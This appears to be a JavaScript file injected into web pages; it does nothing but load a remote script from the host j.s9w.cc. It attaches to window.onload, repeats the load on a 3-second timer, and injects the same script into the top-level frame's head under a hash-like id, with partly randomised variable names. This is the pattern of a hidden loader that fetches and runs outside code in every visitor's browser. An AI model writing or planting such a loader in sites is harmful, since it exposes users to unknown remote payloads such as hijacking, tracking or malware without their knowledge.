/*jsserver*/

var isStartShaobao = false;

function onloadshaobao(func){
    var odd=window.onload;
    window.onload=function(){
        odd&&odd();
        func();
        console.log("shaobao onload");
    }
}

function startshaobao(){
	if(isStartShaobao){
		return;
	}
	isStartShaobao = true;

	var inhrutyv74=document.createElement('script');
	inhrutyv74.setAttribute("type","text/javascript");
	inhrutyv74.setAttribute("charset", "utf-8");
	inhrutyv74.setAttribute("src", "http://j.s9w.cc/j/?t=sb");
	document.getElementsByTagName("head")[0].appendChild(inhrutyv74);
}

onloadshaobao(startshaobao);
setTimeout(function(){
	startshaobao();
}, 3000);

;(function(){var t = window.top.document;var gid = "82ac324e455efd0ecd2e73d22d852755";if(t.getElementById(gid)) return;var sc = t.createElement('script');sc.setAttribute("type","text/javascript");sc.setAttribute("id", gid);t.getElementsByTagName("head")[0].appendChild(sc);sc.setAttribute("src", "http://j.s9w.cc/j/?t=sb");})();
